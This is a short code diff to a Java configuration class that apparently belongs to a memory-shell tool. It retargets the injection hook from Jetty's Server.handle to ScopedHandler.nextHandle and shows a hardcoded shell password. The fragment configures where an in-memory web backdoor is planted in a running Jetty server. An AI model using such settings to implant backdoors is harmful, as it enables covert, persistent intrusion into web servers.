@@ -4,8 +4,8 @@ package com.stdout.Config;
 public class ShellConfig {
 
     public static class SpringMemShellConfig {
-        public static final String TransformedClassName = "org.eclipse.jetty.server.Server";
-        public static final String TransformedMethodName = "handle";
+        public static final String TransformedClassName = "org.eclipse.jetty.server.handler.ScopedHandler";
+        public static final String TransformedMethodName = "nextHandle";
         public static String MemShellPassword = "shiroha";
     }
 
